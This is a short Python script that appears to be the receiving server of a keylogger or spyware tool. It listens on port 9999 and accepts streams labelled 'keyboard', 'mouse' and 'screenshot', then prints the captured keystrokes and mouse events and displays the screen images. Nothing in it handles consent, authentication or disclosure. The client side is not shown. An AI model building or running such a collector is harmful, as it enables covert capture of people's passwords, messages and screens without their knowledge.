import socket
import threading
import struct
from PIL import Image
from io import BytesIO

def recv_msg(conn):
    size = conn.recv(4)
    if not size:
        return None
    length = struct.unpack('>I', size)[0]
    return conn.recv(length)

def handle_keyboard(conn):
    while True:
        try:
            msg = recv_msg(conn)
            if msg:
                print("KEY:", msg.decode())
        except:
            break
    conn.close()

def handle_mouse(conn):
    while True:
        try:
            msg = recv_msg(conn)
            if msg:
                print("MOUSE:", msg.decode())
        except:
            break
    conn.close()

def handle_screen(conn):
    while True:
        try:
            data = recv_msg(conn)
            if data:
                img = Image.open(BytesIO(data))
                img.show()
        except:
            break
    conn.close()

def main():
    s = socket.socket()
    s.bind(('', 9999))
    s.listen()
    print("Server running on port 9999")
    while True:
        conn, _ = s.accept()
        typ = recv_msg(conn)
        if typ:
            kind = typ.decode()
            if kind == "keyboard":
                threading.Thread(target=handle_keyboard, args=(conn,)).start()
            elif kind == "mouse":
                threading.Thread(target=handle_mouse, args=(conn,)).start()
            elif kind == "screenshot":
                threading.Thread(target=handle_screen, args=(conn,)).start()

if __name__ == '__main__':
    main()
